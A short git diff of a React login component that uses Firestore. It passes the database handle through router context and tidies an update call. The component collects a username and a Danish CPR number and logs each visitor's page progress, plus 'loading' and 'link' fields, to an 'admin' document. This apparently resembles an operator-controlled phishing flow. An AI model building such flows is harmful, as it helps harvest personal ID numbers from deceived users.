@@ -1,10 +1,9 @@
 import { arrayUnion, doc, setDoc, updateDoc } from "firebase/firestore";
 import React, { useState } from "react";
 import { useOutletContext } from "react-router-dom";
-import { db } from "../../firebase";
 
 function Login() {
-  const [identifier, setIdentifier] = useOutletContext();
+  const [identifier, setIdentifier, db] = useOutletContext();
   const [bruger, setBruger] = useState("");
   const [cpr, setCpr] = useState("");
   const BrugerData = async () => {
@@ -18,8 +17,8 @@ function Login() {
     await updateDoc(doc(db, "admin", identifier), {
       loading: true,
       link: "",
-      date: (new Date()).toISOString(),
-      pagesDone: arrayUnion("login")
+      date: new Date().toISOString(),
+      pagesDone: arrayUnion("login"),
     });
   };
 
